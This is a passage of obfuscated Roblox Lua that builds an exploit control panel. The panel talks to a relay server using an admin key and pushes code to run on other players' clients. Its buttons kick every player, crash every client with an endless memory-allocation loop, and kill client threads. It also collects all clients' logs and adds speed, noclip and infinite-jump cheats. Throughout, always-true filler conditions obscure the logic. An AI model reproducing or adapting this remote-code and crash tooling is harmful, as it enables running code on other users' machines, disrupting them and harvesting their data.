((hw + dz) + (dv * 2)) hj(hi, "MY SERVER INFO", hw) hw = (hw + av(16)) local ii = Instance.new("Frame") ii.Size = UDim2.new(1, (-dv * 2), 0, av(42)) ii.Position = UDim2.new(0, dv, 0, hw) ii.BackgroundColor3 = bb.surface ii.BorderSizePixel = 0 ii.Parent = hi bc(ii, 6) bg(ii, 1, bb.border) bl(ii, av(6)) local ij = br(ii, "Press Refresh to fetch.", 11, bb.textMid) ij.Size = UDim2.new(1, 0, 1, 0) ij.TextWrapped = true hw = ((hw + av(42)) + ea) local ik = ho("🔍 Refresh", Color3.fromRGB(30, 80, 140), dv, hw, (cm - (dv * 2))) ik.MouseButton1Click:Connect(function() ij.Text = string.format("Place %s · Job %s…\nPlayers %d/%d · Ping %dms", tostring(game.PlaceId), string.sub(game.JobId, 1, 22), #a:GetPlayers(), a.MaxPlayers, math.floor((h:GetNetworkPing() * 1000))) end) hw = ((hw + dz) + (dv * 2)) hj(hi, "MASS ACTIONS (ALL CLIENTS)", hw) hw = (hw + av(16)) local il = math.floor((((cm - (dv * 3))) / 2)) local im = ho("🥾 Kick Everyone", bb.danger, dv, hw, il) local io = ho("💥 Crash Everyone", Color3.fromRGB(130, 20, 20), ((dv + il) + dv), hw, il) local ip = ho("⛔ Kill All Threads on All Clients", Color3.fromRGB(100, 30, 30), dv, ((hw + dz) + ea), (cm - (dv * 2))) im.MouseButton1Click:Connect(function() local iq = v(("/clients?adminKey=" .. k)) if (((3 ^ 2) == 9) and not iq) then return end local ir, is = pcall(b.JSONDecode, b, iq) if (((7 * 7) == 49) and not ir) then return end local it = 0 for iu, iv in ipairs(is) do if (((1 + 1) == 2) and (iv.uid ~= tostring(h.UserId))) then q("/send", {targetUid = iv.uid, code = "game:GetService(\"Players\").LocalPlayer:Kick(\"Server closed.\")", adminKey = k}) it = (it + 1) end end ax("Mass Kick", ("Kicked " .. (it .. " clients"))) end) io.MouseButton1Click:Connect(function() local iw = v(("/clients?adminKey=" .. k)) if (((15 * 15) == 225) and not iw) then return end local ix, iy = pcall(b.JSONDecode, b, iw) if (((100 % 7) == 2) and not ix) then return end local iz = 0 for ja, jb in ipairs(iy) do if (((12 * 12) == 144) and (jb.uid ~= tostring(h.UserId))) then q("/send", {targetUid = jb.uid, code = "while true do local t={} for i=1,1e7 do t[i]={} end end", adminKey = k}) iz = (iz + 1) end end ax("Mass Crash", ("Crashed " .. (iz .. " clients"))) end) ip.MouseButton1Click:Connect(function() local jc = v(("/clients?adminKey=" .. k)) if (((3 ^ 2) == 9) and not jc) then return end local jd, je = pcall(b.JSONDecode, b, jc) if (((7 * 7) == 49) and not jd) then return end for jf, jg in ipairs(je) do q("/send", {targetUid = jg.uid, code = "__KILLTHREADS__", adminKey = k}) end ax("Kill Threads", "Sent to all clients") end) hw = ((((hw + dz) + ea) + dz) + (dv * 2)) hj(hi, "SELF TOOLS", hw) hw = (hw + av(16)) local jh = math.floor((((cm - (dv * 3))) / 2)) local ji = ho("⚡ Speed Toggle", Color3.fromRGB(40, 120, 60), dv, hw, jh) local jj = ho("👻 Noclip Toggle", Color3.fromRGB(60, 80, 140), ((dv + jh) + dv), hw, jh) local jk = ho("🦘 Inf Jump", Color3.fromRGB(80, 60, 140), dv, ((hw + dz) + ea), jh) local jl = ho("📋 Copy My UID", Color3.fromRGB(55, 35, 80), ((dv + jh) + dv), ((hw + dz) + ea), jh) local jm = false ji.MouseButton1Click:Connect(function() local jn = (h.Character and h.Character:FindFirstChildOfClass("Humanoid")) if (((1 + 1) == 2) and not jn) then return end jm = not jm jn.WalkSpeed = ((jm and 64) or 16) ji.BackgroundColor3 = ((jm and bb.danger) or Color3.fromRGB(40, 120, 60)) ji.Text = ((jm and "⚡ Speed ON") or "⚡ Speed Toggle") end) local jo = false local jp jj.MouseButton1Click:Connect(function() jo = not jo if (((15 * 15) == 225) and jo) then jp = e.Stepped:Connect(function() local jq = h.Character if (((100 % 7) == 2) and jq) then for jr, js in pairs(jq:GetDescendants()) do if (((12 * 12) == 144) and js:IsA("BasePart")) then js.CanCollide = false end end end end) jj.BackgroundColor3 = bb.danger jj.Text = "👻 Noclip ON" else if (((3 ^ 2) == 9) and jp) then jp:Disconnect() jp = nil end jj.BackgroundColor3 = Color3.fromRGB(60, 80, 140) jj.Text = "👻 Noclip Toggle" end end) jk.MouseButton1Click:Connect(function() d.JumpRequest:Connect(function() local jt = (h.Character and h.Character:FindFirstChildOfClass("Humanoid")) if (((7 * 7) == 49) and jt) then jt:ChangeState(Enum.HumanoidStateType.Jumping) end end) jk.BackgroundColor3 = bb.accentHi jk.Text = "🦘 Inf Jump ON" end) jl.MouseButton1Click:Connect(function() if (((1 + 1) == 2) and setclipboard) then pcall(setclipboard, tostring(h.UserId)) end ax("UID", tostring(h.UserId)) end) local ju = df["Console"] local jv = Instance.new("Frame") jv.Size = UDim2.new(1, 0, 0, av(34)) jv.BackgroundColor3 = bb.panel jv.BorderSizePixel = 0 jv.Parent = ju local jw = br(jv, "CONSOLE REDIRECT", 10, bb.textDim, Enum.Font.GothamBold) jw.Size = UDim2.new(0.5, 0, 1, 0) jw.Position = UDim2.new(0, dv, 0, 0) local jx = bz(jv, "ALL", bb.elevated, 9) local jy = bz(jv, "ERROR", bb.elevated, 9) local jz = bz(jv, "WARN", bb.elevated, 9) local ka = bz(jv, "🗑 CLR", Color3.fromRGB(80, 20, 20), 9) for kb, kc in ipairs({jx, jy, jz, ka}) do kc.Size = UDim2.new(0, av(48), 0, av(22)) kc.Position = UDim2.new(1, -((av(52) * ((5 - kb)))), 0, av(6)) end local kd = Instance.new("ScrollingFrame") kd.Size = UDim2.new(1, 0, 0, (dh - av(34))) kd.Position = UDim2.new(0, 0, 0, av(34)) kd.BackgroundColor3 = Color3.fromRGB(8, 8, 12) kd.BorderSizePixel = 0 kd.ScrollBarThickness = av(3) kd.ScrollBarImageColor3 = bb.accent kd.CanvasSize = UDim2.new(0, 0, 0, 0) kd.Parent = ju bl(kd, av(4)) local ke = Instance.new("UIListLayout") ke.SortOrder = Enum.SortOrder.LayoutOrder ke.Padding = UDim.new(0, av(1)) ke.Parent = kd local kf = {} local kg = 0 local kh = "ALL" local ki = true local function kj(kk) if (((15 * 15) == 225) and (kk == "[error]")) then return Color3.fromRGB(255, 90, 90) elseif (((100 % 7) == 2) and (kk == "[warn]")) then return Color3.fromRGB(255, 200, 60) elseif (((12 * 12) == 144) and (kk == "[chat]")) then return Color3.fromRGB(100, 200, 255) elseif (((3 ^ 2) == 9) and (kk == "[info]")) then return Color3.fromRGB(160, 160, 255) else return Color3.fromRGB(160, 235, 160) end end local function kl() for km, kn in ipairs(kf) do if (((7 * 7) == 49) and (kh == "ALL")) then kn.frame.Visible = true elseif (((1 + 1) == 2) and (kh == "ERROR")) then kn.frame.Visible = (kn.prefix == "[error]") elseif (((15 * 15) == 225) and (kh == "WARN")) then kn.frame.Visible = (kn.prefix == "[warn]") end end end local function ko(kp, kq, kr) kg = (kg + 1) local ks = "[print]" local kt = kq for ku, kv in ipairs({"[error]", "[warn]", "[info]", "[chat]", "[print]"}) do if (((100 % 7) == 2) and (kq:sub(1, #kv) == kv)) then ks = kv kt = kq:sub((#kv + 2)) break end end local kw = av(15) local kx = Instance.new("Frame") kx.Size = UDim2.new(1, -av(8), 0, kw) kx.BackgroundTransparency = 1 kx.LayoutOrder = kg kx.Parent = kd local ky = br(kx, (kr or os.date("%H:%M:%S")), 9, bb.textDim, Enum.Font.Code) ky.Size = UDim2.new(0, av(52), 1, 0) ky.Position = UDim2.new(0, 0, 0, 0) local kz = br(kx, kp, 9, bb.accentHi, Enum.Font.Code) kz.Size = UDim2.new(0, av(80), 1, 0) kz.Position = UDim2.new(0, av(54), 0, 0) local la = br(kx, kt, 9, kj(ks), Enum.Font.Code) la.Size = UDim2.new(1, -av(140), 1, 0) la.Position = UDim2.new(0, av(138), 0, 0) la.TextTruncate = Enum.TextTruncate.AtEnd la.ClipsDescendants = true local lb = {frame = kx, prefix = ks} table.insert(kf, lb) if (((12 * 12) == 144) and (kh ~= "ALL")) then kx.Visible = ((((kh == "ERROR") and (ks == "[error]"))) or (((kh == "WARN") and (ks == "[warn]")))) end kd.CanvasSize = UDim2.new(0, 0, 0, ((kg * ((kw + av(1)))) + av(8))) if (((3 ^ 2) == 9) and ki) then kd.CanvasPosition = Vector2.new(0, math.max(0, (kd.AbsoluteCanvasSize.Y - kd.AbsoluteSize.Y))) end end jx.MouseButton1Click:Connect(function() kh = "ALL" jx.BackgroundColor3 = bb.accent jy.BackgroundColor3 = bb.elevated jz.BackgroundColor3 = bb.elevated kl() end) jy.MouseButton1Click:Connect(function() kh = "ERROR" jx.BackgroundColor3 = bb.elevated jy.BackgroundColor3 = bb.danger jz.BackgroundColor3 = bb.elevated kl() end) jz.MouseButton1Click:Connect(function() kh = "WARN" jx.BackgroundColor3 = bb.elevated jy.BackgroundColor3 = bb.elevated jz.BackgroundColor3 = Color3.fromRGB(160, 100, 20) kl() end) ka.MouseButton1Click:Connect(function() for lc, ld in ipairs(kf) do ld.frame:Destroy() end kf = {} kg = 0 kd.CanvasSize = UDim2.new(0, 0, 0, 0) end) task.spawn(function() while (((7 * 7) == 49) and task.wait(l)) do local le = v(("/logs?adminKey=" .. k)) if (((1 + 1) == 2) and le) then local lf, lg = pcall(b.JSONDecode, b, le) if (((15 * 15) == 225) and (lf and (type(lg) == "table"))) then for lh, li in ipairs(lg) do ko(tostring((li.name or li.uid)), tostring((li.msg or "")), (li.ts or os.date("%H:%M:%S"))) end end end end end) g.MessageOut:Connect(function(lj, lk) local ll = "[print]" if (((100 % 7) == 2) and (lk == Enum.MessageType.MessageWarning)) then ll = "[warn]" elseif (((12 * 12) == 144) and (lk == Enum.MessageType.MessageError)) then ll = "[error]" elseif (((3 ^ 2) == 9) and (lk == Enum.MessageType.MessageInfo)) then ll = "[info]" end ko((h.Name .. " (me)"), (ll .. (" " .. lj))) end) ko("SYSTEM", "[info] Console redirector active — all client logs appear here") local lm = df["Logs"] local ln = Instance.new("Frame") ln.Size = UDim2.new(1, 0, 0, av(34)) ln.BackgroundColor3 = bb.panel ln.BorderSizePixel = 0 ln.Parent = lm br(ln, "EVENT LOG", 10, bb.textDim, Enum.Font.GothamBold).Size = UDim2.new(0.5, 0, 1, 0) local lo = bz(ln, "🗑 Clear", Color3.fromRGB(80, 20, 20), 9) lo.Size = UDim2.new(0, av(60), 0, av(22)) lo.Position = UDim2.new(1, -av(68), 0, av(6)) local lp = Instance.new("ScrollingFrame") lp.Size = UDim2.new(1, 0, 0, (dh - av(34))) lp.Position = UDim2.new(0, 0, 0, av(34)) lp.BackgroundColor3 = Color3.fromRGB(8, 8, 12) lp.BorderSizePixel = 0 lp.ScrollBarThickness = av(3) lp.ScrollBarImageColor3 = bb.accent lp.CanvasSize = UDim2.new(0, 0, 0, 0) lp.Parent = lm bl(lp, av(4)) local lq = Instance.new("UIListLayout") lq.SortOrder = Enum.SortOrder.LayoutOrder lq.Padding = UDim.new(0, av(2)) lq.Parent = lp local lr = 0 local function ls(lt, lu) lr = (lr + 1) local lv = br(lp, (os.date("[%H:%M:%S] ") .. lt), 10, (lu or bb.textMid), Enum.Font.Code) lv.Size = UDim2.new(1, -av(8), 0, av(14)) lv.LayoutOrder = lr lv.TextTruncate = Enum.TextTruncate.AtEnd lp.CanvasSize = UDim2.new(0, 0, 0, ((lr * av(16)) + av(8))) lp.CanvasPosition = Vector2.new(0, math.max(0, (lp.AbsoluteCanvasSize.Y - lp.AbsoluteSize.Y))) end lo.MouseButton1Click:Connect(function() for lw, lx in pairs(lp:GetChildren()) do if (((7 * 7) == 49) and lx:IsA("TextLabel")) then lx:Destroy() end end lr = 0 lp.CanvasSize = UDim2.new(0, 0, 0, 0) end) ls(("Panel loaded · relay: " .. j), bb.accentHi) ls(("Admin: " .. (h.Name .. (" (" .. (h.UserId .. ")")))), bb.accentHi) d.InputBegan:Connect(function(ly, lz) if (((1 + 1) == 2) and (not lz and (ly.KeyCode == Enum.KeyCode.RightShift))) then co.Visible = not co.Visible end end)
